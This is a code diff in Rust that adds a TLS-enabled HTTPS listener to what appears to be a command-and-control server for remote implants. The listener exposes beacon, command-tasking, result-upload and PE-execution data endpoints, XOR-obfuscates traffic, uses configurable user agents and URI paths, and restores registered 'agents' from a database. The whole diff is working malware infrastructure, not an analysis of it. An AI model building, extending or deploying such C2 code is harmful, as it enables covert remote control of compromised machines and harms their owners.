@@ -1,8 +1,9 @@
 use crate::admin::Database;
 use crate::agents::agent_handler::{AgentHandler, AgentInfo};
 use crate::encryption::XORCipher;
-use crate::listener::profile::ListenerProfile;
+use crate::listener::profile::{ListenerProfile, ListenerProfileHttps};
 use axum::Server;
+use axum_server::tls_rustls::RustlsConfig;
 use base64::{engine::general_purpose::STANDARD, Engine as _};
 use serde::{Deserialize, Serialize};
 use std::net::SocketAddr;
@@ -21,6 +22,14 @@ use axum::{
 #[derive(Clone)]
 struct HttpListenerState {
     profile: ListenerProfile,
+    agent_handler: AgentHandler,
+    xor_cipher: Arc<XORCipher>,
+    database: Arc<Database>,
+}
+
+#[derive(Clone)]
+struct HttpsListenerState {
+    profile: ListenerProfileHttps,
     agent_handler: AgentHandler,
     xor_cipher: Arc<XORCipher>,
     database: Arc<Database>,
@@ -816,5 +825,90 @@ pub async fn start(profile: ListenerProfile, agent_handler: AgentHandler, databa
 
     if let Err(e) = server.await {
         log::error!("[!] Listener error: {}", e);
+    }
+}
+
+// ===== FONCTION START_HTTPS AVEC TLS =====
+pub async fn start_https(
+    profile: ListenerProfileHttps,
+    agent_handler: AgentHandler,
+    database: Arc<Database>,
+) {
+    let xor_cipher = Arc::new(XORCipher::new(&profile.xor_key));
+
+    log::info!(
+        "[*] Loading existing agents for HTTPS listener '{}'...",
+        profile.name
+    );
+    match agent_handler.load_agents_from_db(&database) {
+        Ok(count) => {
+            if count > 0 {
+                log::info!("[+] ✅ Restored {} existing agent(s) from database", count);
+            } else {
+                log::info!("[*] No existing agents to restore");
+            }
+        }
+        Err(e) => {
+            log::error!("[!] ⚠️  Failed to load agents from database: {}", e);
+            log::warn!("[!] Continuing without restored agents...");
+        }
+    }
+
+    // ===== Configuration TLS avec rustls =====
+    let tls_config = match RustlsConfig::from_pem(
+        profile.tls_cert.as_bytes().to_vec(),
+        profile.tls_key.as_bytes().to_vec(),
+    )
+    .await
+    {
+        Ok(config) => {
+            log::info!("[+] TLS configuration loaded successfully");
+            config
+        }
+        Err(e) => {
+            log::error!("[!] Failed to load TLS configuration: {}", e);
+            log::error!("[!] Make sure the certificate and key are valid PEM format");
+            return;
+        }
+    };
+
+    // Créer un profil HTTP standard pour réutiliser les handlers existants
+    let http_profile = ListenerProfile {
+        name: profile.name.clone(),
+        host: profile.host.clone(),
+        listener_type: profile.listener_type.clone(),
+        port: profile.port,
+        user_agent: profile.user_agent.clone(),
+        xor_key: profile.xor_key.clone(),
+        uri_paths: profile.uri_paths.clone(),
+        http_headers: profile.http_headers.clone(),
+    };
+
+    let state = Arc::new(HttpListenerState {
+        profile: http_profile.clone(),
+        agent_handler,
+        xor_cipher,
+        database,
+    });
+
+    let app = Router::new()
+        .route(&http_profile.uri_paths, post(handle_beacon))
+        .route("/api/pe-data/:command_id", get(get_pe_exec_data))
+        .route("/api/command", post(handle_get_commands))
+        .route("/api/result", post(handle_submit_result))
+        .with_state(state);
+
+    let addr = SocketAddr::from(([0, 0, 0, 0], profile.port));
+    log::info!(
+        "[+] HTTPS Listener '{}' starting on {} (TLS enabled)",
+        profile.name,
+        addr
+    );
+
+    if let Err(e) = axum_server::bind_rustls(addr, tls_config)
+        .serve(app.into_make_service())
+        .await
+    {
+        log::error!("[!] HTTPS Listener error: {}", e);
     }
 }
